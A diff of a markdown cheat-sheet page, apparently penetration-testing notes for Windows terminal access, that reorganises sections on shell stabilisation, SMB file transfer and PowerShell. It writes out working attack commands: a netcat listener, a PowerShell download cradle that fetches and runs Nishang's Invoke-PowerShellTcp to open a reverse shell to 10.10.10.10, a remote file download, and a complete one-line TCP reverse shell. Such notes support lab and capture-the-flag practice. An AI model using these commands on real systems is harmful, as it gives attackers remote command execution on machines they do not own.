@@ -1,26 +1,7 @@
 ---
 sidebar_position: 1
-title: Shell Stabilisation
+title: Terminal
 ---
-
-
-import Tabs from '@theme/Tabs';
-import TabItem from '@theme/TabItem';
-
-
-## Stabilisation
-
-- **Common Upload Location:**
-
-```powrshell
-C:\Windows\Temp
-```
-
-- **Enable Unicode Characters Support**
-
-```batch
-chcp 65001
-```
 
 - **Shell Stabilisation**
 
@@ -28,38 +9,14 @@ chcp 65001
 rlwrap nc -nvlp 8888
 ```
 
-- **Set Keyboard Layout**
-
-```
-Set-WinUserLanguageList -LanguageList en-US -force
-```
 
 ## SMBServer  
 
 - **Transfer Files to Windows with `SMBServer`** 
 
-<Tabs>
-  <TabItem value="apple" label="Modern">
-    <div style={{color: 'red'}}>
-
 ```log
-smbserver.py SHARE_NAME /DIRECTORY/HOSTING/FILES        
+smbserver.py SHARE_NAME /DIRECTORY/HOSTING/FILES
 ```
-
-</div>
-  </TabItem>
-  <TabItem value="orange" label="Legacy">
-    <div style={{color: 'red'}}>
-
-```log
-smbserver.py -smb2support -username USER_NAME -password PASSWORD public share
-```
-
-</div>
-  </TabItem>
-</Tabs>
-
-<br/>
 
 - **Remote Commands [From the Windows Machine]**
 
@@ -71,11 +28,6 @@ copy \\10.10.10.10\LINUXSHARE\FILE_NAME.md FILE_NAME.md  # Copy Files
 
 ## PSH
 
-- **Transfering - Executing [One Liner]**
-
-```powershell
-powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444   # [Invoke-PowerShellTcp] - Nishang GIT Repo
-```
 
 - **Transfering Files**
 
@@ -83,8 +35,38 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:888
 powershell (New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10:8888/FileName.exe','FileName.exe')
 ```
 
+- **Transfer - Execute** <a class="button button--outline button--info" href="https://github.com/samratashok/nishang">Nishang GitHub</a>
+
+```powershell
+# [Invoke-PowerShellTcp] - Nishang
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
+```
+
+
 - **Reverse Shell [It may be Necessary to Encode the PAYLOAD in `URL` Format]**
 
 ```powershell
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+<br/>
+
+## Other
+
+- **Recommended `Upload Location`**
+
+```log
+C:\Windows\Temp
+```
+
+- **Enable `Unicode Characters` Support**
+
+```batch
+chcp 65001
+```
+
+- **Set Keyboard Layout**
+
+```powershell
+Set-WinUserLanguageList -LanguageList en-US -force
 ```
